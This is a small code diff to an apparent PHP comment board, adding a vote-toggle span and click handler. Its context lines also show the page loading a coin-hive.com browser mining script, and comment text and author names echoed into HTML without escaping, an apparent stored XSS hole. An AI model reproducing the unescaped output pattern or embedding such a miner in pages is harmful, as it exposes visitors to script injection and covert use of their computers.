@@ -49,7 +49,7 @@
               <div class="col-md-' . $lvl . '"></div>
               <div class="col-md-' . (12 - $lvl) . '">
                 <div class="jumbotron well">';
-      echo '<p>' . $text . '</p>  -' . $author . ' @ ' . $creation . '<br><br>';
+      echo '<p><span class="vote"> </span>' . $text . '</p>  -' . $author . ' @ ' . $creation . '<br><br>';
       //Print the buttons
       echo '<button class="commentButton" onclick="unhide(this,\'childComment' . $id . '\')">Reply</button>';
       //if not already flagged, give option to flagged
@@ -86,6 +86,10 @@
     <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
     <link rel="stylesheet" href="css/pages.css">
     <script type="text/javascript">
+      //Vote Button
+      $('.vote').click(function () {
+        $(this).toggleClass('on');
+      });
       //Post hider
       function unhide(clickedButton, divID) {
         var item = document.getElementById(divID);
